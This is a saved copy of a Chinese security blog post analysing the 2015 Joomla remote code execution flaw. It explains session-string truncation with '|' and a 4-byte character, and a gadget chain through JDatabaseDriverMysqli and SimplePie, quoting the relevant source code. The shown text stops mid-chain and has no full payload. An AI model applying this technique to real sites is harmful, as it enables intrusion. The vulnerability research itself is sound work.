
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
<meta content="phithonçš„å°ç«™ï¼Œé•¿æœŸå­˜åœ¨ä¸åˆ†äº«å…³äºç½‘ç»œå®‰å…¨ä¸å„ç§ç¼–ç¨‹çš„åŸåˆ›æ–‡ç« ã€‚" name="description"/>
<meta content="ç½‘ç»œå®‰å…¨,ä»£ç å®¡è®¡,ä¿¡æ¯å®‰å…¨,æ¼æ´æŒ–æ˜,php,C++,mysql,python" name="keywords"/>
<link href="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/favicon.ico" rel="shortcut icon"/>
<link href="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
<link href="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
<title>Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰ | ç¦»åˆ«æ­Œ</title>
<link href="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/font-awesome.min.css" rel="stylesheet"/>
<link href="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/styles.css" rel="stylesheet"/>
<link href="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/style.css" rel="stylesheet"/>
<link href="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/flexboxgrid.min.css" rel="stylesheet"/>
<link href="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/feed" rel="alternate" title="ç¦»åˆ«æ­Œ" type="application/atom+xml">
<script src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/jquery.min.js"></script>
<link href="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/code.css" rel="stylesheet"/>
<link href="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/button.css" rel="stylesheet"/>
<link href="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/pagination.css" rel="stylesheet"/>
<link href="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/jquery.fancybox.min.css" rel="stylesheet"/>
</link></meta></head>
<body>
<div id="header-post">
<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
<span id="menu" style="visibility: visible">
<span id="nav">
<ul>
<li><a href="/">ä¸»é¡µ</a></li>
<li><a href="javascript:history.back(-1)">è¿”å›</a></li>
</ul>
</span>
<br/>
<span id="actions">
<ul>
<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
</ul>
<span class="info" id="i-top" style="display:none;">Back to top</span>
<span class="info" id="i-share" style="display:none;">Share post</span>
</span>
<br/>
<div id="share" style="display: none">
<ul>
<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;text=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;title=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;is_video=false&amp;description=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
<li><a class="icon" href="mailto:?subject=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;title=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;title=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;title=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;title=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;name=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
</ul>
</div>
</span>
</div>
<div class="content index width mx-auto px2 my4">
<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
<header>
<h1 class="posttitle" itemprop="name headline">Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰</h1>
<div class="meta">
<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
<span itemprop="name">Phithon</span>
</span>
<div class="postdate">
<time datetime="2015å¹´12æœˆ27æ—¥ 22:29" itemprop="datePublished">
                    2015 åäºŒæœˆ 27 22:29
                </time>
</div>
<div class="article-tag">
            é˜…è¯»ï¼š3671
            </div>
<div class="article-tag">
<i class="fa fa-bookmark"></i>
<a class="tag-link" href="/sort/PENETRATION">ç½‘ç»œå®‰å…¨</a>
</div>
<div class="article-tag">
<i class="fa fa-tag"></i>
<a class="tag-link" href="/tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">ååºåˆ—åŒ–æ¼æ´</a>,
                
                <a class="tag-link" href="/tag/joomla">joomla</a>,
                
                <a class="tag-link" href="/tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">å‘½ä»¤æ‰§è¡Œæ¼æ´</a>
</div>
</div>
</header>
<div class="content" itemprop="articleBody">
<p>joomlaæ¼æ´å‡ºæ¥è¿™ä¹ˆä¹…äº†ï¼Œæˆ‘ä¹Ÿäºå½“å¤©åœ¨dropså‘è¡¨äº†è¿™ç¯‡æ–‡ç« ( <a href="http://drops.wooyun.org/papers/11330"><a href="http://drops.wooyun.org/papers/11330">http://drops.wooyun.org/papers/11330</a></a>Â )ã€‚ä»Šå¤©å†çœ‹ï¼Œè¿˜æ˜¯æœ‰ç‚¹æ€¥ä¿ƒï¼Œæœ‰äº›åŸç†ä¸Šçš„ä¸œè¥¿æ²¡è¯´æ¸…æ¥šã€‚</p>
<p>æˆ‘åœ¨è‡ªå·±åšå®¢é‡Œï¼ŒæŠŠè¿™ç¯‡æ–‡ç« å¢åŠ ä¸€äº›åŸç†ä¸Šçš„è¯´æ˜ï¼Œå‘å‡ºæ¥ç•™ä¸ªåº•ç¨¿ã€‚</p>
<h2 id="session"><a class="toclink" href="#session">æ¼æ´ç‚¹ â€”â€” ååºåˆ—åŒ–session</a></h2>
<p>è¿™ä¸ªæ¼æ´å­˜åœ¨äºååºåˆ—åŒ–sessionçš„è¿‡ç¨‹ä¸­ã€‚</p>
<p>æ¼æ´å­˜åœ¨äº libraries/joomla/session/session.php ä¸­ï¼Œ_validateå‡½æ•°ï¼Œå°†uaå’Œxffè°ƒç”¨setæ–¹æ³•è®¾ç½®åˆ°äº†sessionä¸­ï¼ˆsession.client.browserå’Œsession.client.forwardedï¼‰</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">protected</span> <span class="k">function</span> <span class="nf">_validate</span><span class="p">(</span><span class="nv">$restart</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="o">...</span>

        <span class="c1">// Record proxy forwarded for in the session in case we need it later</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">]))</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">'session.client.forwarded'</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">]);</span>
        <span class="p">}</span>

        <span class="o">...</span>
        <span class="c1">// Check for clients browser</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="s1">'fix_browser'</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_security</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">]))</span>
        <span class="p">{</span>
            <span class="nv">$browser</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'session.client.browser'</span><span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="nv">$browser</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">'session.client.browser'</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">]);</span>
            <span class="p">}</span>
            <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$browser</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="c1">// @todo remove code: $this-&gt;_state = 'error';</span>
                <span class="c1">// @todo remove code: return false;</span>
            <span class="p">}</span>
        <span class="p">}</span> 
</pre></div>
<p>æœ€ç»ˆè·Ÿéšä»–ä»¬ä¿©è¿›å…¥æ•°æ®åº“ï¼Œsessionè¡¨ï¼š</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201512/39d01451235948.jpg"><img alt="14501741134471.jpg" src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/thum-39d01451235948.jpg"/></a></p>
<p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œä¸å­˜åœ¨ä»»ä½•é—®é¢˜ã€‚å› ä¸ºæˆ‘ä»¬æ§åˆ¶çš„åªæ˜¯ååºåˆ—åŒ–å¯¹è±¡ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¸ä¼šè§¦å‘ååºåˆ—ç›¸å…³çš„æ¼æ´ã€‚</p>
<p>ä½†æ˜¯ï¼Œå› ä¸ºä¸€ä¸ªå°å§¿åŠ¿ï¼Œå¯¼è‡´åé¢æˆ‘ä»¬å¯ä»¥æ§åˆ¶æ•´ä¸ªååºåˆ—åŒ–å¯¹è±¡ã€‚</p>
<h2 id="_1"><a class="toclink" href="#_1">åˆ©ç”¨|å­—ç¬¦ä¼ªé€ ï¼Œæ§åˆ¶æ•´ä¸ªååºåˆ—åŒ–å­—ç¬¦ä¸²</a></h2>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å…ˆçœ‹çœ‹@Ryatè€å¸ˆçš„pch-013ï¼š <a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md"><a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md">https://github.com/80vul/phpcodz/blob/master/research/pch-013.md</a></a></p>
<p>å’Œpch-013ä¸­çš„æƒ…å†µç±»ä¼¼ï¼Œjoomlaä¹Ÿæ²¡æœ‰é‡‡ç”¨phpè‡ªå¸¦çš„sessionå¤„ç†æœºåˆ¶ï¼Œè€Œæ˜¯ç”¨å¤šç§æ–¹å¼ï¼ˆåŒ…æ‹¬databaseã€memcacheç­‰ï¼‰è‡ªå·±ç¼–å†™äº†å­˜å‚¨sessionçš„å®¹å™¨ï¼ˆstorageï¼‰ã€‚</p>
<p>å…¶å­˜å‚¨æ ¼å¼ä¸ºã€é”®å ï¼‹ ç«–çº¿ ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ã€ï¼Œå…¶æœªæ­£ç¡®å¤„ç†å¤šä¸ªç«–çº¿çš„æƒ…å†µã€‚</p>
<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬è¿™é‡Œå°±å¯ä»¥é€šè¿‡æ³¨å…¥ä¸€ä¸ª<code>|</code>ç¬¦å·ï¼Œå°†å®ƒå‰é¢çš„éƒ¨åˆ†å…¨éƒ¨è®¤ä¸ºæ˜¯nameï¼Œè€Œ|åé¢æˆ‘å°±å¯ä»¥æ’å…¥ä»»æ„serializeå­—ç¬¦ä¸²ï¼Œæ„é€ ååºåˆ—åŒ–æ¼æ´äº†ã€‚</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201512/16e81451235948.jpg"><img alt="14501748976406.jpg" src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/thum-16e81451235948.jpg"/></a></p>
<p>ä½†è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨æˆ‘ä»¬æ„é€ å¥½çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²åé¢ï¼Œè¿˜æœ‰å®ƒåŸæœ¬çš„å†…å®¹ï¼Œå¿…é¡»è¦æˆªæ–­ã€‚è€Œæ­¤å¤„å¹¶ä¸åƒSQLæ³¨å…¥ï¼Œè¿˜æœ‰æ³¨é‡Šç¬¦å¯ç”¨ã€‚</p>
<p>ä½†ä¸çŸ¥å„ä½æ˜¯å¦è¿˜è®°å¾—å½“å¹´wordpresså‡ºè¿‡çš„ä¸€ä¸ªXSS( <a href="http://www.leavesongs.com/HTML/wordpress-4-1-stored-xss.html"><a href="http://www.leavesongs.com/HTML/wordpress-4-1-stored-xss.html">http://www.leavesongs.com/HTML/wordpress-4-1-stored-xss.html</a></a> )ï¼Œå½“æ—¶å°±æ˜¯åœ¨æ’å…¥æ•°æ®åº“çš„æ—¶å€™åˆ©ç”¨"ğŒ†"ï¼ˆ%F0%9D%8C%86ï¼‰å­—ç¬¦å°†utf-8çš„å­—æ®µæˆªæ–­äº†ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬ç”¨åŒæ ·çš„æ–¹æ³•ï¼Œåœ¨sessionè¿›å…¥æ•°æ®åº“çš„æ—¶å€™å°±æˆªæ–­åé¢çš„å†…å®¹ï¼Œé¿å…å¯¹æˆ‘ä»¬ååºåˆ—åŒ–è¿‡ç¨‹é€ æˆå½±å“ã€‚</p>
<h2 id="_2"><a class="toclink" href="#_2">åŸç†æ¢ç©¶ï¼šä½•è°“å¤„ç†å¤šä¸ª|ä¸åˆç†</a></h2>
<p>å®é™…ä¸Šæ˜¯phpåº•å±‚å¯¹sessionå­—ç¬¦ä¸²å¤„ç†çš„ä¸åˆç†ã€‚</p>
<p>å…¶å®L.Nçš„æ–‡ç« é‡Œå·²ç»å¯ä»¥çœ‹åˆ°åŸç†äº† <a href="http://bobao.360.cn/learning/detail/2501.html"><a href="http://bobao.360.cn/learning/detail/2501.html">http://bobao.360.cn/learning/detail/2501.html</a></a></p>
<p>åœ¨php5.6.13ä»¥å‰çš„ç‰ˆæœ¬é‡Œï¼Œphpåœ¨è·å–sessionå­—ç¬¦ä¸²ä»¥åï¼Œå°±å¼€å§‹æŸ¥æ‰¾ç¬¬ä¸€ä¸ª|ï¼Œç„¶åç”¨è¿™ä¸ª|å°†å­—ç¬¦ä¸²åˆ†å‰²æˆã€é”®åã€å’Œã€é”®å€¼ã€ã€‚<br>
ç”¨unserializeè§£æé”®å€¼ï¼Œè§£æç»“æœä½œä¸ºsessionã€‚</br></p>
<p>ä½†å¦‚æœè¿™ä¸ªunserializeè§£æå¤±è´¥ï¼Œå°±æ”¾å¼ƒè¿™æ¬¡è§£æã€‚æ‰¾åˆ°ä¸‹ä¸€ä¸ª|ï¼Œå†æ ¹æ®è¿™ä¸ª|å°†å­—ç¬¦ä¸²åˆ†å‰²æˆä¸¤éƒ¨åˆ†ï¼Œæ‰§è¡ŒåŒæ ·çš„æ“ä½œï¼Œç›´åˆ°è§£ææˆåŠŸã€‚</p>
<p>æ‰€ä»¥ï¼Œè¿™ä¸ªjoomlaæ¼æ´çš„æ ¸å¿ƒå†…å®¹å°±æ˜¯ï¼šæˆ‘ä»¬é€šè¿‡ğŒ†å­—ç¬¦ï¼Œ å°†åŸæœ¬çš„sessionæˆªæ–­äº†ï¼Œç»“æœå› ä¸ºé•¿åº¦ä¸å¯¹æ‰€ä»¥ç¬¬ä¸€æ¬¡è§£æ|å¤±è´¥ï¼Œæ‰è½®åˆ°ç¬¬äºŒæ¬¡è§£ææˆ‘ä¼ å…¥çš„|ï¼Œæœ€åæˆåŠŸåˆ©ç”¨ã€‚</p>
<p>æ‰€ä»¥ï¼Œæ„é€ sessionå‡ºé”™ï¼Œæ˜¯è¿™ä¸ªæ¼æ´æˆç«‹çš„æ ¸å¿ƒã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬è¿˜èƒ½ä¸èƒ½æƒ³åˆ°å…¶ä»–åˆ©ç”¨æ–¹æ³•ï¼Ÿ</p>
<p>æ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨é•¿å­—ç¬¦ï¼ˆ64kï¼‰ä¸²æˆªæ–­ï¼Œæ¥è¾¾æˆç±»ä¼¼å’ŒğŒ†å­—ç¬¦æˆªæ–­ä¸€æ ·çš„æ•ˆæœã€‚</p>
<p>è¿™å‡ å¤©ï¼Œjoomlaå†æ¬¡å¯¹æ­¤æ¼æ´è¿›è¡Œäº†åŠ å›ºï¼š <a href="http://bobao.360.cn/learning/detail/2527.html"><a href="http://bobao.360.cn/learning/detail/2527.html">http://bobao.360.cn/learning/detail/2527.html</a></a> ï¼Œå¤„ç†çš„å¾ˆä¼˜ç§€ï¼Œæ¬£èµè¿™æ ·çš„æ€åº¦ã€‚</p>
<h2 id="pop"><a class="toclink" href="#pop">æ„é€ POPæ‰§è¡Œé“¾ï¼Œæ‰§è¡Œä»»æ„ä»£ç </a></h2>
<p>åœ¨å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–å¯¹è±¡ä»¥åï¼Œæˆ‘ä»¬åªéœ€æ„é€ ä¸€ä¸ªèƒ½å¤Ÿä¸€æ­¥æ­¥è°ƒç”¨çš„æ‰§è¡Œé“¾ï¼Œå³å¯è¿›è¡Œä¸€äº›å±é™©çš„æ“ä½œäº†ã€‚</p>
<p>expæ„é€ çš„æ‰§è¡Œé“¾ï¼Œåˆ†åˆ«åˆ©ç”¨äº†å¦‚ä¸‹ç±»ï¼š</p>
<ol>
<li>JDatabaseDriverMysqli</li>
<li>SimplePie</li>
</ol>
<p>æˆ‘ä»¬å¯ä»¥åœ¨JDatabaseDriverMysqliç±»çš„ææ„å‡½æ•°é‡Œæ‰¾åˆ°ä¸€å¤„æ•æ„Ÿæ“ä½œï¼š</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">disconnect</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="o">...</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">disconnect</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="c1">// Close the connection.</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">disconnectHandlers</span> <span class="k">as</span> <span class="nv">$h</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="nb">call_user_func_array</span><span class="p">(</span><span class="nv">$h</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span> <span class="o">&amp;</span><span class="nv">$this</span><span class="p">));</span>
            <span class="p">}</span>

            <span class="nx">mysqli_close</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
    <span class="p">}</span> 
</pre></div>
<p>å½“expå¯¹è±¡ååºåˆ—åŒ–åï¼Œå°†ä¼šæˆä¸ºä¸€ä¸ªJDatabaseDriverMysqliç±»å¯¹è±¡ï¼Œä¸ç®¡ä¸­é—´å¦‚ä½•æ‰§è¡Œï¼Œæœ€åéƒ½å°†ä¼šè°ƒç”¨<code>__destruct</code>ï¼Œ<code>__destruct</code>å°†ä¼šè°ƒç”¨<code>disconnect</code>ï¼Œ<code>disconnect</code>é‡Œæœ‰ä¸€å¤„æ•æ„Ÿå‡½æ•°ï¼š<code>call_user_func_array</code>ã€‚</p>
<p>ä½†å¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œçš„<code>call_user_func_array</code>çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ˜¯æˆ‘ä»¬æ— æ³•æ§åˆ¶çš„ã€‚æ‰€ä»¥ä¸èƒ½ç›´æ¥æ„é€ assert+evalæ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<p>äºæ˜¯è¿™é‡Œå†æ¬¡è°ƒç”¨äº†ä¸€ä¸ªå¯¹è±¡ï¼šSimplePieç±»å¯¹è±¡ï¼Œå’Œå®ƒçš„initæ–¹æ³•ç»„æˆä¸€ä¸ªå›è°ƒå‡½æ•°[new SimplePie(), 'init']ï¼Œä¼ å…¥<code>call_user_func_array</code>ã€‚</p>
<p>è·Ÿè¿›initæ–¹æ³•ï¼š</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">init</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="c1">// Check absolute bare minimum requirements.</span>
        <span class="k">if</span> <span class="p">((</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'version_compare'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">version_compare</span><span class="p">(</span><span class="k">PHP_VERSION</span><span class="p">,</span> <span class="s1">'4.3.0'</span><span class="p">,</span> <span class="s1">'&lt;'</span><span class="p">))</span> <span class="o">||</span> <span class="o">!</span><span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">'xml'</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">'pcre'</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="o">...</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span> <span class="o">!==</span> <span class="k">null</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">raw_data</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">multifeed_objects</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
            <span class="nv">$cache</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>

            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="nv">$parsed_feed_url</span> <span class="o">=</span> <span class="nx">SimplePie_Misc</span><span class="o">::</span><span class="na">parse_url</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span><span class="p">);</span>
                <span class="c1">// Decide whether to enable caching</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span> <span class="o">&amp;&amp;</span> <span class="nv">$parsed_feed_url</span><span class="p">[</span><span class="s1">'scheme'</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">''</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="nv">$cache</span> <span class="o">=</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_class</span><span class="p">,</span> <span class="s1">'create'</span><span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_location</span><span class="p">,</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_name_function</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span><span class="p">),</span> <span class="s1">'spc'</span><span class="p">);</span>
                <span class="p">}</span> 
</pre></div>
